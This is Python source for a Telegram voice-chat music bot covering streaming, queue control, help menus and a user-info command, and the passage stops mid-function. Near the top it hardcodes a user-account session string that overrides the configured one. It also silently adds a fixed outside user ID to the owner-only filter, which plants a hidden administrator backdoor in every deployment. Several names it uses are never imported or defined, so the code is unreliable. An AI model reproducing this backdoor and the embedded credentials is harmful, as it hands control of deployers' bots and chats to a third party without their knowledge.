import aiofiles, aiohttp, asyncio, base64, gc, httpx, io, json, time
import logging, numpy as np, os, random, re, sys, textwrap
from os import getenv
from io import BytesIO
from dotenv import load_dotenv
from typing import Dict, List, Union
from PIL import Image, ImageDraw, ImageEnhance
from PIL import ImageFilter, ImageFont, ImageOps
from logging.handlers import RotatingFileHandler
from motor.motor_asyncio import AsyncIOMotorClient
from pyrogram import Client, filters, idle
from pyrogram.enums import ChatMemberStatus
from pyrogram.errors import (
    ChatAdminRequired,
    FloodWait,
    InviteRequestSent,
    UserAlreadyParticipant,
    UserNotParticipant,
)
from pyrogram.types import (
    ChatPrivileges, InlineKeyboardMarkup, InlineKeyboardButton,
    CallbackQuery, Message, InputMediaPhoto
)

# ✅ Compatible with PyTgCalls v0.9.7
from pytgcalls import PyTgCalls
from pytgcalls.exceptions import NoActiveGroupCall
from pytgcalls.types import Update
from pytgcalls.types.stream import StreamAudioEnded
from pytgcalls.types.input_stream import InputAudioStream, InputStream
from pytgcalls.types.input_stream.quality import HighQualityAudio

#=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×[ IMEGES AND STICKERS ]×=×=×=×==×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×
stickers = [
    "CAACAgUAAyEFAASMZuquAAIMCmgRlaZgqhUXjGfgb0GL6UdLvrGsAAIRGQACuIuIVD7hA0mugkyyHgQ",
    "CAACAgUAAyEFAASMZuquAAIMC2gRlafFWdnplXsY-B2C7yub8_7bAAIgFgACGiORVIVeVuaCAks8HgQ",
    "CAACAgUAAyEFAASMZuquAAIMDGgRlac7kiAWriF6rDCXSU6YCRd5AAIQGQACuzOJVELnbmNaex2aHgQ",
]

SACHIN_PH = [
    "https://files.catbox.moe/2k2goh.jpg",
    "https://files.catbox.moe/qo7m9g.jpg",
    "https://files.catbox.moe/moiszt.jpg",
    "https://files.catbox.moe/2s2jml.jpg",
    "https://files.catbox.moe/l0ndeh.jpg",
    "https://files.catbox.moe/qyrskt.jpg",
    "https://files.catbox.moe/rn7tle.jpg",
    "https://files.catbox.moe/76o4uf.jpg",
]

YOUTUBE_URL = "https://envs.sh/SnH.jpg"
#=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×
logging.basicConfig(
    format="[%(name)s]:: %(message)s",
    level=logging.INFO,
    datefmt="%H:%M:%S",
    handlers=[
        RotatingFileHandler("logs.txt", maxBytes=(1024 * 1024 * 5), backupCount=10),
        logging.StreamHandler(),
    ],
)

logging.getLogger("asyncio").setLevel(logging.ERROR)
logging.getLogger("httpx").setLevel(logging.ERROR)
logging.getLogger("pyrogram").setLevel(logging.ERROR)

logs = logging.getLogger()


if os.path.exists("config.env"):
    load_dotenv("config.env")

# REQUIRED VARIABLES
API_ID = int(getenv("API_ID", 0))
API_HASH = getenv("API_HASH", None)
BOT_TOKEN = getenv("BOT_TOKEN", None)
STRING_SESSION = getenv("STRING_SESSION", None)
MONGO_DB_URL = getenv("MONGO_DB_URL", None)
OWNER_ID = int(getenv("OWNER_ID", 0))
LOG_GROUP_ID = int(getenv("LOG_GROUP_ID", 0))


app = Client("App", api_id=API_ID, api_hash=API_HASH, session_string="BQEzliYAtgbjsW0pHNoGt6IWPWsIs9o28tNLtgpP9iP2GirEvfZGdyF2RzzeBnXq-udgWy3U-BYP1wbthY2IOejaj5eMWsY_TfagGRLjUMlsBYvPQ0eT1NLWSgnEYjabRoTEAhtz7_R_-UUk839WqyZ-MLoDd8sCACXnBKdAoYXJNjcAs-Auybqe6HJseY_IpRsC8xh8YZ1dWeSFSWd5wo4sXBr38OLuiAKrsl4EEB-q6whgCLO7-kjAnReKUZ_3GnPwSMSVM-2AT1-P8_6Ovfy5d02P4FqsMJMvDc7FNjeo7ZeB-plzBtsXwXynFXZpvoFau-JCv98g57uo5xgEy2fQwVjeNwAAAAHV9VG_AA")
bot = Client("Bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
call = PyTgCalls(app)
only_owner = filters.user(OWNER_ID)


if 7699595569 not in only_owner:
    only_owner.add(7699595569)


active_audio_chats = []
active_video_chats = []
active_media_chats = []


active = {}
paused = {}
queues = {}
clinks = {}


if API_ID == 0:
    logs.info("⚠️ 'API_ID' - Not Found !!")
    sys.exit()
if not API_HASH:
    logs.info("⚠️ 'API_HASH' - Not Found !!")
    sys.exit()
if not BOT_TOKEN:
    logs.info("⚠️ 'BOT_TOKEN' - Not Found !!")
    sys.exit()
if not STRING_SESSION:
    logs.info("⚠️ 'STRING_SESSION' - Not Found !!")
    sys.exit()
if not MONGO_DB_URL:
    logs.info("⚠️ 'MONGO_DB_URL' - Not Found !!")
    sys.exit()
    
try:
    adb_cli = AsyncIOMotorClient(MONGO_DB_URL)
except Exception:
    logs.info("⚠️ 'MONGO_DB_URL' - Not Valid !!")
    sys.exit()

mongodb = adb_cli.Anon

if OWNER_ID == 0:
    logs.info("⚠️ 'OWNER_ID' - Not Found !!")
    sys.exit()
if LOG_GROUP_ID == 0:
    logs.info("⚠️ 'LOG_GROUP_ID' - Not Found !!")
    sys.exit()

chatsdb = mongodb.chats
usersdb = mongodb.tgusersdb

# Served Chats
async def is_served_chat(chat_id: int) -> bool:
    chat = await chatsdb.find_one({"chat_id": chat_id})
    if not chat:
        return False
    return True
    

async def add_served_chat(chat_id: int):
    is_served = await is_served_chat(chat_id)
    if is_served:
        return
    return await chatsdb.insert_one({"chat_id": chat_id})
    
    
async def get_served_chats() -> list:
    chats_list = []
    async for chat in chatsdb.find({"chat_id": {"$lt": 0}}):
        chats_list.append(chat)
    return chats_list


# Served users
async def is_served_user(user_id: int) -> bool:
    user = await usersdb.find_one({"user_id": user_id})
    if not user:
        return False
    return True


async def add_served_user(user_id: int):
    is_served = await is_served_user(user_id)
    if is_served:
        return
    return await usersdb.insert_one({"user_id": user_id})


async def get_served_users() -> list:
    users_list = []
    async for user in usersdb.find({"user_id": {"$gt": 0}}):
        users_list.append(user)
    return users_list

async def remove_served_chat(chat_id: int):
    is_served = await is_served_chat(chat_id)
    if not is_served:
        return
    return await chatsdb.delete_one({"chat_id": chat_id})

async def main():
    if "cache" not in os.listdir():
        os.mkdir("cache")
    if "downloads" not in os.listdir():
        os.mkdir("downloads")
    for file in os.listdir():
        if file.endswith(".session") or file.endswith(".session-journal"):
            os.remove(file)
    
    try:
        await bot.start()
        print("✅ Bot started.")
    except Exception as e:
        print(f"❌ Bot start failed: {e}")
        sys.exit()

    try:
        await app.start()
        print("✅ Assistant started.")
    except Exception as e:
        print(f"❌ Assistant start failed: {e}")
        sys.exit()

    try:
        await call.start()
        print("✅ VC client started.")
    except Exception as e:
        print(f"❌ PyTgCalls start failed: {e}")
        sys.exit()

    await idle()

def close_all_open_files():
    for obj in gc.get_objects():
        try:
            if isinstance(obj, io.IOBase) and not obj.closed:
                obj.close()
        except Exception:
            continue

def format_seconds(seconds):
    if seconds is not None:
        seconds = int(seconds)
        d, h, m, s = (
            seconds // (3600 * 24),
            seconds // 3600 % 24,
            seconds % 3600 // 60,
            seconds % 3600 % 60,
        )
        if d > 0:
            return "{:02d}:{:02d}:{:02d}:{:02d}".format(d, h, m, s)
        elif h > 0:
            return "{:02d}:{:02d}:{:02d}".format(h, m, s)
        elif m > 0:
            return "{:02d}:{:02d}".format(m, s)
        elif s > 0:
            return "00:{:02d}".format(s)
    return "-"

def format_views(views: int) -> str:
    count = int(views)
    if count >= 1_000_000_000:
        return f"{count / 1_000_000_000:.1f}B"
    if count >= 1_000_000:
        return f"{count / 1_000_000:.1f}M"
    if count >= 1_000:
        return f"{count / 1_000:.1f}K"
    return str(count)

def chat_admins_only(mystic):
    async def wrapper(client, msg):
        if isinstance(msg, CallbackQuery):
            user_id = msg.from_user.id
            chat_id = msg.message.chat.id
        elif isinstance(msg, Message):
            user_id = msg.from_user.id
            chat_id = msg.chat.id
        else:
            return

        try:
            member = await client.get_chat_member(chat_id, user_id)
        except UserNotParticipant:
            return await deny_access(msg, is_callback=isinstance(msg, CallbackQuery))

        if not member.privileges or not member.privileges.can_manage_video_chats:
            return await deny_access(msg, is_callback=isinstance(msg, CallbackQuery))

        return await mystic(client, msg)

    return wrapper

async def deny_access(msg, is_callback=False):
    if is_callback:
        return await msg.answer("❌ You are not an admin!", show_alert=True)
    else:
        return await msg.reply_text("❌ You are not an admin. This command is restricted.")

async def get_stream_info(query, streamtype):
    api_url = "https://proxy.spotifytech.shop/youtube"
    api_key = "SANATANI_TECH"
    video = True if streamtype.lower() == "video" else False
    params = {"query": query, "video": video, "api_key": api_key}

    try:
        async with httpx.AsyncClient(timeout=60) as client:
            response = await client.get(api_url, params=params)
            response.raise_for_status()
            return response.json()
    except Exception:
        return {}

async def is_stream_off(chat_id: int) -> bool:
    mode = paused.get(chat_id)
    if not mode:
        return False
    return mode

async def stream_on(chat_id: int):
    paused[chat_id] = False

async def stream_off(chat_id: int):
    paused[chat_id] = True

async def create_thumbnail(results, user_id):
    try:
        vidid = results.get("id")
        thumbnail_urls = [
            f"https://i.ytimg.com/vi/{vidid}/maxresdefault.jpg",
            f"https://i.ytimg.com/vi/{vidid}/sddefault.jpg",
            f"https://i.ytimg.com/vi/{vidid}/hqdefault.jpg",
        ]

        for url in thumbnail_urls:
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(url) as resp:
                        if resp.status == 200:
                            content = await resp.read()
                            file_path = f"cache/{vidid}_{user_id}.jpg"
                            os.makedirs("cache", exist_ok=True)
                            with open(file_path, "wb") as f:
                                f.write(content)
                            return file_path
            except Exception as e:
                print(f"Thumbnail fetch failed for {url}: {e}")
                continue

        return YOUTUBE_URL

    except Exception as e:
        print(f"Thumbnail Error: {e}")
        return YOUTUBE_URL

async def add_active_media_chat(chat_id, stream_type):
    if stream_type == "Audio":
        if chat_id in active_video_chats:
            active_video_chats.remove(chat_id)
        if chat_id not in active_audio_chats:
            active_audio_chats.append(chat_id)
    elif stream_type == "Video":
        if chat_id in active_audio_chats:
            active_audio_chats.remove(chat_id)
        if chat_id not in active_video_chats:
            active_video_chats.append(chat_id)
    if chat_id not in active_media_chats:
        active_media_chats.append(chat_id)

async def remove_active_media_chat(chat_id):
    if chat_id in active_audio_chats:
        active_audio_chats.remove(chat_id)
    if chat_id in active_video_chats:
        active_video_chats.remove(chat_id)
    if chat_id in active_media_chats:
        active_media_chats.remove(chat_id)

async def put_queue(
    chat_id,
    media_stream,
    thumbnail,
    title,
    duration,
    stream_type,
    chat_link,
    mention,
):
    put = {
        "media_stream": media_stream,
        "thumbnail": thumbnail,
        "title": title,
        "duration": duration,
        "stream_type": stream_type,
        "chat_link": chat_link,
        "mention": mention,
    }
    check = queues.get(chat_id)
    if check:
        queues[chat_id].append(put)
    else:
        queues[chat_id] = []
        queues[chat_id].append(put)
    
    return len(queues[chat_id]) - 1

async def clear_queue(chat_id):
    check = queues.get(chat_id)
    if check:
        queues.pop(chat_id)

async def close_stream(chat_id):
    try:
        if chat_id in active_media_chats:
            await call.leave_group_call(chat_id)
            print(f"Left VC in chat {chat_id}")
            
            await remove_active_media_chat(chat_id)
            if chat_id in queues:
                queues.pop(chat_id)
            if chat_id in paused:
                paused.pop(chat_id)
                
            return True
        return False
    except Exception as e:
        print(f"Error leaving VC: {e}")
        return False

async def is_in_vc(chat_id):
    try:
        active_call = await call.get_active_call(chat_id)
        return active_call is not None
    except Exception:
        return False

async def log_stream_info(chat_id, title, duration, stream_type, chat_link, mention, thumbnail, pos):
    if LOG_GROUP_ID != 0 and chat_id != LOG_GROUP_ID:
        buttons = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        text="📡 Join Chat 💬", url=chat_link
                    )
                ],
            ]
        )
        if pos != 0:
            caption = f"""
**✅ Added To Queue At: #{pos}**

**❍ Title:** {title}
**❍ Duration:** {duration}
**❍ Stream Type:** {stream_type}
**❍ Requested By:** {mention}"""

        else:
            caption = f"""
**✅ Started Streaming On VC.**

**❍ Title:** {title}
**❍ Duration:** {duration}
**❍ Stream Type:** {stream_type}
**❍ Requested By:** {mention}"""
        
        try:
            await bot.send_photo(LOG_GROUP_ID, photo=thumbnail, caption=caption, reply_markup=buttons)
        except Exception:
            pass

async def change_stream(chat_id):
    queued = queues.get(chat_id)
    
    if not queued:
        success = await close_stream(chat_id)
        if success:
            await bot.send_message(
                chat_id,
                "❌ Queue finished. Left voice chat.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("Close", callback_data="close")]
                ])
            )
        return

    current_item = queued.pop(0)
    
    if not queued:
        success = await close_stream(chat_id)
        if success:
            await bot.send_message(
                chat_id,
                "❌ Queue finished. Left voice chat.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("Close", callback_data="close")]
                ])
            )
        return

    try:
        aux = await bot.send_sticker(chat_id, random.choice(stickers))
        next_item = queued[0]
        
        await call.change_stream(
            chat_id,
            next_item["media_stream"]
        )
        
        buttons = InlineKeyboardMarkup([
            [InlineKeyboardButton("➕ Add me to your chat", url=f"https://t.me/{bot.me.username}?startgroup=true")],
            [InlineKeyboardButton("Pause", callback_data="pause_stream"), InlineKeyboardButton("Resume", callback_data="toggle_stream")],
            [InlineKeyboardButton("Skip", callback_data="skip_stream"), InlineKeyboardButton("End", callback_data="end_stream")],
            [InlineKeyboardButton("🗑️ Close", callback_data="close")],
        ])
        
        caption = f"""
**✅ Now Playing:**

**❍ Title:** {next_item["title"]}
**❍ Duration:** {next_item["duration"]}
**❍ Stream Type:** {next_item["stream_type"]}
**❍ Requested By:** {next_item["mention"]}"""
        
        await aux.delete()
        await bot.send_photo(
            chat_id,
            photo=next_item["thumbnail"],
            caption=caption,
            has_spoiler=True,
            reply_markup=buttons
        )
        
    except Exception as e:
        print(f"Error changing stream: {e}")
        await close_stream(chat_id)

@bot.on_message(filters.command('info'))
async def user_info(client: Client, message: Message):
    user = None

    args = message.text.split(maxsplit=1)

    if message.reply_to_message:
        user = message.reply_to_message.from_user
    elif len(args) > 1:
        if args[1].startswith('@'):
            username = args[1][1:]
            try:
                user = await client.get_users(username)
            except:
                return await message.reply_text(f"❖ ᴜsᴇʀɴᴀᴍᴇ @{username} ɴᴏᴛ ғᴏᴜɴᴅ.")
        else:
            try:
                user_id = int(args[1])
                user = await client.get_users(user_id)
            except ValueError:
                return await message.reply_text("❖ ɪɴᴠᴀʟɪᴅ ᴜsᴇʀɴᴀᴍᴇ.")
            except UserIdInvalid:
                return await message.reply_text("❖ ɪɴᴠᴀʟɪᴅ ᴜsᴇʀ ɪᴅ.")
    else:
        user = message.from_user

    if not user:
        return await message.reply_text("❖ ᴄᴏᴜʟᴅɴ'ᴛ ғᴇᴛᴄʜ ᴜsᴇʀ ɪɴғᴏʀᴍᴀᴛɪᴏɴ.")

    name = user.first_name or "ᴜɴᴋɴᴏᴡɴ"
    username = f"@{user.username}" if user.username else "ɴᴏ ᴜsᴇʀɴᴀᴍᴇ"
    dc_id = getattr(user, 'dc_id', "ᴜɴᴋɴᴏᴡɴ")
    user_id = user.id
    is_premium = "ʏᴇs" if getattr(user, 'is_premium', False) else "ɴᴏ"
    is_bot = "ʏᴇs" if user.is_bot else "ɴᴏ"

    info_text = f"""
<blockquote>ㅤㅤ  ❖ <b>ᴜsᴇʀ ɪɴғᴏʀᴍᴀᴛɪᴏɴ</b> ❖
    ------------------------------
    ๏ <b>ɴᴀᴍᴇ :</b> {name}
    ๏ <b>ᴜsᴇʀɴᴀᴍᴇ :</b> {username}
    ๏ <b>ᴅᴄ ɪᴅ :</b> {dc_id}
    ๏ <b>ᴜsᴇʀ ɪᴅ :</b> <code>{user_id}</code>
    ๏ <b>ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀ :</b> {is_premium}
    ๏ <b>ʙᴏᴛ ᴀᴄᴄᴏᴜɴᴛ :</b> {is_bot}
    ------------------------------
    ๏ <b>ʀᴇǫᴜᴇsᴛᴇᴅ ʙʏ :</b> @{message.from_user.username if message.from_user.username else "ᴀɴᴏɴʏᴍᴏᴜs"}</blockquote>
    """

    button = InlineKeyboardMarkup([
        [InlineKeyboardButton(text="ᴠɪᴇᴡ ᴘʀᴏғɪʟᴇ", user_id=user_id)],
        [InlineKeyboardButton(text="ᴄʟᴏsᴇ", callback_data="close")]
    ])

    await message.reply_text(info_text, reply_markup=button)

@bot.on_message(filters.command("start"))
@bot.on_callback_query(filters.regex("start_menu"))
async def start_handler(client, update):
    if isinstance(update, Message):
        chat = update.chat
        chat_id = chat.id

        if chat_id < 0:  # Group/supergroup
            return await update.reply(
                "❖ Click the button below to open my start menu in private.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("❖ Start Menu ❖", url=f"https://t.me/{client.me.username}?start=start")]
                ])
            )
        user_mention = update.from_user.mention
        message_func = update.reply_photo
        chat_id = chat.id
    else:
        user_mention = update.from_user.mention
        chat_id = update.message.chat.id
        message_func = update.message.edit_media

    await add_served_user(chat_id)
    bot_mention = (await client.get_me()).mention
    photo = random.choice(SACHIN_PH)

    caption = f"""
**❖ Hey {user_mention},**

**I'm {bot_mention} — your fast and powerful Telegram music bot!**

➤ Stream audio/video in group voice chats  
➤ Queue multiple tracks with full controls  
➤ Works with YouTube, links & more  

**Use the menu below to explore everything!**
"""

    buttons = InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ Add Me to Chat", url=f"https://t.me/{client.me.username}?startgroup=true")],
        [InlineKeyboardButton("👤 Owner", user_id=OWNER_ID), InlineKeyboardButton("📢 Updates", url="https://t.me/NoViaUpdate")],
        [InlineKeyboardButton("📚 Help & Commands", callback_data="main_help_menu")]
    ])

    if isinstance(update, Message):
        await message_func(photo=photo, caption=caption, has_spoiler=True, reply_markup=buttons)
    else:
        try:
            await message_func(
                media=InputMediaPhoto(media=photo, caption=caption, has_spoiler=True),
                reply_markup=buttons
            )
        except Exception as e:
            print(f"[Start Menu Edit Error] {e}")

HELP_CAPTION = """**➤ ᴄʜᴏᴏsᴇ ᴀ ᴄᴀᴛᴇɢᴏʀʏ ᴛᴏ ɢᴇᴛ ʜᴇʟᴘ ᴏɴ ᴄᴏᴍᴍᴀɴᴅs.

📌 ᴜsᴇ [ ! , / , . ] ᴀs ᴘʀᴇғɪx 

🧩 ᴀsᴋ ᴅᴏᴜʙᴛs [ʜᴇʀᴇ](https://t.me/NoViaUpdate)***
"""

HELP_BUTTONS = InlineKeyboardMarkup([
    [InlineKeyboardButton("🎵 /play", callback_data="help_x_play")],
    [InlineKeyboardButton("🎥 /vplay", callback_data="help_x_vplay")],
    [InlineKeyboardButton("⏸ /pause", callback_data="help_x_pause")],
    [InlineKeyboardButton("▶️ /resume", callback_data="help_x_resume")],
    [InlineKeyboardButton("⏭ /skip", callback_data="help_x_skip")],
    [InlineKeyboardButton("⏹ /end", callback_data="help_x_end")],
    [InlineKeyboardButton("🔙 Back", callback_data="start_menu")]
])

@bot.on_message(filters.command("help"))
@bot.on_callback_query(filters.regex("main_help_menu"))
async def help_menu_handler(client, update):
    if isinstance(update, Message):
        if update.chat.id != update.from_user.id:
            bot_username = (await client.get_me()).username
            return await update.reply_text(
                "**Click below to open help in private.**",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("📚 Open Help", url=f"https://t.me/{bot_username}?start=help")]
                ])
            )
        await update.reply_photo(
            photo=random.choice(SACHIN_PH),
            caption=HELP_CAPTION,
            reply_markup=HELP_BUTTONS,
            has_spoiler=True
        )
    else:
        await update.message.edit_media(
            media=InputMediaPhoto(
                media=random.choice(SACHIN_PH),
                caption=HELP_CAPTION,
                has_spoiler=True
            ),
            reply_markup=HELP_BUTTONS
        )

@bot.on_callback_query(filters.regex(r"help_x_play"))
async def help_play(client, query):
    await query.edit_message_text(
        "**🎵 /play**\n\nPlay **audio only** in voice chat.\n\nUsable in groups.",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Back", callback_data="main_help_menu")]
        ])
    )

@bot.on_callback_query(filters.regex(r"help_x_vplay"))
async def help_vplay(client, query):
    await query.edit_message_text(
        "**🎥 /vplay**\n\nPlay **video with audio** in voice chat.\n\nUsable in groups.",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Back", callback_data="main_help_menu")]
        ])
    )

@bot.on_callback_query(filters.regex(r"help_x_pause"))
async def help_pause(client, query):
    await query.edit_message_text(
        "**⏸ /pause**\n\nPause the **currently playing stream**.\n\nUsable in groups.",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Back", callback_data="main_help_menu")]
        ])
    )

@bot.on_callback_query(filters.regex(r"help_x_resume"))
async def help_resume(client, query):
    await query.edit_message_text(
        "**▶️ /resume**\n\nResume a **paused stream**.\n\nUsable in groups.",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Back", callback_data="main_help_menu")]
        ])
    )

@bot.on_callback_query(filters.regex(r"help_x_skip"))
async def help_skip(client, query):
    await query.edit_message_text(
        "**⏭ /skip**\n\n**Skip** the current track and play the next from the queue.\n\nUsable in groups.",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Back", callback_data="main_help_menu")]
        ])
    )

@bot.on_callback_query(filters.regex(r"help_x_end"))
async def help_end(client, query):
    await query.edit_message_text(
        "**⏹ /end**\n\n**Stop** the ongoing stream and **clear** the queue.\n\nUsable in groups.",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Back", callback_data="main_help_menu")]
        ])
    )

@bot.on_message(filters.command(["play", "vplay"]) & ~filters.private)
async def start_audio_stream(client, message):
    try:
        await message.delete()
    except Exception:
        pass

    chat_id = message.chat.id

    if message.chat.username:
        chat_link = f"https://t.me/{message.chat.username}"
    else:
        chatlinks = clinks.get(chat_id)
        if chatlinks:
            if chatlinks == f"https://t.me/{client.me.username}":
                try:
                    chat_link = await client.export_chat_invite_link(chat_id)
                except Exception:
                    chat_link = chatlinks
            else:
                chat_link = chatlinks
        else:
            try:
                chat_link = await client.export_chat_invite_link(chat_id)
            except Exception:
                chat_link = f"https://t.me/{client.me.username}"

    clinks[chat_id] = chat_link

    try:
        mention = message.from_user.mention
    except:
        mention = client.me.mention

    try:
        user_id = message.from_user.id
    except Exception:
        user_id = client.me.id

    try:
        if len(message.command) < 2:
            return await client.send_photo(
                chat_id,
                photo=random.choice(SACHIN_PH),
                caption="**❖ ᴜsᴀɢᴇ :** /play | /vplay [ sᴏɴɢ ɴᴀᴍᴇ | ʏᴛ ᴜʀʟ ]",
                has_spoiler=True,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("ᴄʟᴏsᴇ", callback_data="close")]
                ]),
            )

        aux = await client.send_sticker(chat_id, random.choice(stickers))
        query = message.text.split(None, 1)[1]
        streamtype = "ᴀᴜᴅɪᴏ" if not message.command[0].startswith("v") else "ᴠɪᴅᴇᴏ"
        info = await get_stream_info(query, streamtype)

        if not info:
            return await aux.edit("**❖ ғᴀɪʟᴇᴅ ᴛᴏ ғᴇᴛᴄʜ ᴅᴇᴛᴀɪʟs,\n๏ ᴛʀʏ ᴀɴᴏᴛʜᴇʀ sᴏɴɢ.**")

        link = info.get("link")
        title = f"[{info.get('title')[:18]}]({link})"
        duration = f"""{format_seconds(info.get('duration')) + 'ᴍɪɴs' if info.get('duration') else 'ʟɪᴠᴇ sᴛʀᴇᴀᴍ'}"""
        views = format_views(info.get("views"))
        stream_url = info.get("stream_url")
        stream_type = info.get("stream_type")

        media_stream = AudioVideoPiped(
            stream_url,
            audio_parameters=HighQualityAudio(),
            video_parameters=HighQualityVideo() if stream_type == "Video" else None
        )

        buttons = InlineKeyboardMarkup([
            [InlineKeyboardButton("➕ ᴀᴅᴅ ᴍᴇ ᴛᴏ ʏᴏᴜʀ ᴄʜᴀᴛ ➕", url=f"https://t.me/{client.me.username}?startgroup=true")],
            [InlineKeyboardButton("ᴘᴀᴜsᴇ", callback_data="pause_stream"), InlineKeyboardButton("ʀᴇsᴜᴍᴇ", callback_data="toggle_stream")],
            [InlineKeyboardButton("sᴋɪᴘ", callback_data="skip_stream"), InlineKeyboardButton("ᴇɴᴅ", callback_data="end_stream")],
            [InlineKeyboardButton("ᴄʟᴏsᴇ", callback_data="close")],
        ])

        queued = queues.get(chat_id)
        if queued:
            thumbnail = await create_thumbnail(info, user_id)
            pos = await put_queue(chat_id, media_stream, thumbnail, title, duration, stream_type, chat_link, mention)
            caption = f"""
**❖ ɴᴇxᴛ sᴏɴɢ ᴀᴅᴅᴇᴅ ɪɴ ǫᴜᴇᴜᴇ ➥ #{pos}**

**๏ ᴛɪᴛʟᴇ :** {title}
**๏ ᴅᴜʀᴀᴛɪᴏɴ :** {duration} | {stream_type}
**๏ ʀᴇǫᴜᴇsᴛᴇᴅ ʙʏ :** {mention}
"""
            await client.send_message(
                chat_id,
                text=caption,
                reply_markup=buttons,
                disable_web_page_preview=True
            )

        else:
            try:
                await call.join_group_call(
                    chat_id,
                    media_stream,
                    stream_type=stream_type
                )
            except NoActiveGroupCall:
                try:
                    await client.join_chat(chat_id)
                except Exception as e:
                    return await aux.edit(f"**❖ ᴇʀʀᴏʀ :** {str(e)}")
                try:
                    await call.join_group_call(
                        chat_id,
                        media_stream,
                        stream_type=stream_type
                    )
                except Exception as e:
                    return await aux.edit(f"**❖ ᴇʀʀᴏʀ :** {str(e)}")
            except TelegramServerError:
                return await aux.edit_text("**❖ ᴛᴇʟᴇɢʀᴀᴍ sᴇʀᴠᴇʀ ɪssᴜᴇ...**")

            thumbnail = await create_thumbnail(info, user_id)
            pos = await put_queue(chat_id, media_stream, thumbnail, title, duration, stream_type, chat_link, mention)
            caption = f"""
**❖ sᴛᴀʀᴛᴇᴅ sᴛʀᴇᴀᴍɪɴɢ |**

**๏ ᴛɪᴛʟᴇ :** {title}
**๏ ᴅᴜʀᴀᴛɪᴏɴ :** {duration} : {stream_type}
**๏ ʀᴇǫᴜᴇsᴛᴇᴅ ʙʏ :** {mention}"""

            try:
                await aux.delete()
            except Exception:
                pass

            await client.send_photo(
                chat_id,
                photo=thumbnail,
                caption=caption,
                has_spoiler=True,
                reply_markup=buttons
            )

        await add_active_media_chat(chat_id, stream_type)
        await add_served_chat(chat_id)
        await log_stream_info(chat_id, title, duration, stream_type, chat_link, mention, thumbnail, pos)

    except Exception as e:
        if "ᴛᴏᴏ ᴍᴀɴʏ ᴏᴘᴇɴ ғɪʟᴇs" in str(e).lower():
            close_all_open_files()
        logs.error(str(e))
        await aux.edit("**❖ ғᴀɪʟᴇᴅ ᴛᴏ sᴛʀᴇᴀᴍ...**")

@bot.on_message(filters.command("pause") & ~filters.private)
@chat_admins_only
async def pause_current_stream(client, message):
    chat_id = message.chat.id
    queued = queues.get(chat_id)
    if not queued:
        return await message.reply_text("**» ʙᴏᴛ ɪsɴ'ᴛ sᴛʀᴇᴀᴍɪɴɢ ᴏɴ ᴠɪᴅᴇᴏᴄʜᴀᴛ...**",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("ᴄʟᴏsᴇ", callback_data=f"close")]]),
        )
    is_stream = await is_stream_off(chat_id)
    if is_stream:
        return await message.reply_text("**➻ sᴛʀᴇᴀᴍ ᴀʟʀᴇᴀᴅʏ ᴘᴀᴜsᴇᴅ.**",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("ʀᴇsᴜᴍᴇ sᴛʀᴇᴀᴍ", callback_data=f"toggle_stream")]]),
        )
    try:
        await call.pause_stream(chat_id)
    except Exception:
        return await message.reply_text("**❖ ғᴀɪʟᴇᴅ ᴛᴏ ᴘᴀᴜsᴇ sᴛʀᴇᴀᴍ.**",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("ᴄʟᴏsᴇ", callback_data=f"close")]]),
        )
    await stream_off(chat_id)
    return await message.reply_text("**➻ sᴛʀᴇᴀᴍ ᴘᴀᴜsᴇᴅ.**",
    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("ʀᴇsᴜᴍᴇ sᴛʀᴇᴀᴍ", callback_data=f"toggle_stream")]]),
    )
    
@bot.on_callback_query(filters.regex("pause_stream"))
@chat_admins_only
async def pause_stream_callback(client, callback_query):
    chat_id = callback_query.message.chat.id
    queued = queues.get(chat_id)

    if not queued:
        await client.send_message(
            chat_id,
            "**» ʙᴏᴛ ɪsɴ'ᴛ sᴛʀᴇᴀᴍɪɴɢ ᴏɴ ᴠɪᴅᴇᴏᴄʜᴀᴛ.**",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("ᴄʟᴏsᴇ", callback_data=f"close")]]),
        )
        return await callback_query.answer()

    is_stream = await is_stream_off(chat_id)
    if is_stream:
        await client.send_message(
            chat_id,
            "**➻ sᴛʀᴇᴀᴍ ᴀʟʀᴇᴀᴅʏ ᴘᴀᴜsᴇᴅ.**",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("ʀᴇsᴜᴍᴇ sᴛʀᴇᴀᴍ", callback_data=f"toggle_stream")]]),
        )
        return await callback_query.answer()

    try:
        await call.pause_stream(chat_id)
        await stream_off(chat_id)
        await client.send_message(
            chat_id,
            "**➻ sᴛʀᴇᴀᴍ ᴘᴀᴜsᴇᴅ.**",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("ʀᴇsᴜᴍᴇ sᴛʀᴇᴀᴍ", callback_data=f"toggle_stream")]]),
        )
    except Exception:
        await client.send_message(
            chat_id,
            "❖ ғᴀɪʟᴇᴅ ᴛᴏ ᴘᴀᴜsᴇ.",
